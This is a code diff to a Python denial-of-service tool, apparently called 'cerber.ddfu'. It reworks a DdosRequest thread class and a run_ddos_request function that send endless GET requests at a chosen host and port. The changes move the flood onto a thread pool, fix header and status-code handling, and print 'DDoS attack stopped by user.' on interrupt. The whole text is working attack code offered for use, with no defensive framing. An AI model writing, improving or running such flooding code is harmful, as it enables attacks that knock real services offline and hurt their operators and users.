@@ -1,5 +1,8 @@
 import random
 import string
+import time
+from concurrent.futures import ThreadPoolExecutor
+
 from cerber.ddfu.src.common import header_service
 from requests import request as req
 import threading
@@ -35,11 +38,11 @@ class DdosRequest(threading.Thread):
             res = req(
                 method='GET',
                 url=url,
-                headers=header_service.header(self.target)
+                headers=header_service.header(url)
             )
             if res.status_code < 300:
                 print(url, color='c', tag_color='g', tag=f"{res.status_code}")
-            if 300 < res.status_code < 400:
+            elif 300 < res.status_code < 400:
                 print(url, color='w', tag_color='y', tag=f"{res.status_code}")
             else:
                 print(url, color='w', tag_color='r', tag=f"{res.status_code}")
@@ -50,12 +53,11 @@ class DdosRequest(threading.Thread):
 
 
 def run_ddos_request(host: str, port: int, user_thread: int):
-    threads = []
-    while True:
+    with ThreadPoolExecutor(max_workers=user_thread) as executor:
         try:
-            for x in range(int(user_thread)):
-                t = DdosRequest(target=host, port=port)
-                t.start()
-                t.join()
+            while True:
+                executor.submit(DdosRequest(target=host, port=port).run)
+                time.sleep(0.1)  # Задержка между запросами
         except KeyboardInterrupt:
+            print("DDoS attack stopped by user.")
             exit(101)
